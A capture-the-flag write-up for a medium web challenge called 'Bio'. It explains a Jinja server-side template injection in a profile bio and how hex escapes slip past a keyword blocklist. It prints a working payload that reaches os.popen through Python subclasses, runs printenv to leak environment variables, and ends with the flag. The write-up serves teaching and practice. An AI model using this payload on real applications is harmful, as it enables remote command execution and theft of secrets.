---
title: "Bio"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: medium
author: "L-BOH"
---

# Bio

## Summary

The profile bio has server-side template injection and a weak keyword blacklist. Hexadecimal escapes hide dangerous names from the filter but are decoded by Jinja.

## Root cause

The server checks the raw bio before injecting it into template source:

~~~python
if BLOCKLIST.search(new_bio):
    return jsonify({"error": "Invalid input"}), 400
...
template = PROFILE_TEMPLATE.format(bio=bio)
return render_template_string(template, user=user)
~~~

The blacklist runs before Jinja decodes string escapes. For example, the raw characters \x5f do not match an underscore check, but Jinja later interprets them as underscores. The render function then evaluates the reconstructed template syntax.

## Vulnerability

Raw payloads containing double underscores or the word os are rejected. However, Jinja understands escapes such as \x5f for underscore and \x6f\x73 for os. The filter sees only harmless backslash characters and letters before Jinja interprets the payload.

## Exploit

Register and log in, then submit this as the bio:

~~~jinja
{% for c in ''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x6d\x72\x6f\x5f\x5f'][1]['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']() %}
{% set g = c['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f') %}
{% if g is not undefined and '\x6f\x73' in g %}
{{ g['\x6f\x73']['\x70\x6f\x70\x65\x6e']('printenv').read() }}
{% endif %}
{% endfor %}
~~~

The payload finds a Python class whose initializer exposes os in its globals, then runs printenv. Reload the profile and read FLAG from the displayed environment.


## Flag

~~~text
Securinets{ssti_w1th_h3x_3ncod1ng_byp4ss}
~~~
